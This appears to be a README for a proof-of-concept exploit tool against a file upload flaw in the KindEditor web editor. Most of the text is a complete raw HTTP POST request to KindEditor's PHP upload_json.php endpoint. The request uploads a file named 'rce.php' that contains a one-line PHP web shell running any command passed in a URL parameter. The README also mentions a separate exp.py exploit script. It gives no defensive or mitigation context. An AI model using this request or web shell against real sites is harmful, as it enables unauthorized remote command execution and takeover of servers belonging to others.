# KindEditor-PoC-Tool
KindEditor PoC Tool ( File Upload Vuln )
/examples/uploadbutton.html CHECK > exp.py

Exploiting PHP Upload:
'''http
POST /Public/Kindeditor/php/upload_json.php?dir=file HTTP/1.1
Host: site.com
User-Agent: Mozilla/5.0
Accept: */*
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Length: 236
Connection: close

------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="imgFile"; filename="rce.php"
Content-Type: application/octet-stream

<?php system($_GET['cmd']); ?>
------WebKitFormBoundary7MA4YWxkTrZu0gW--
'''
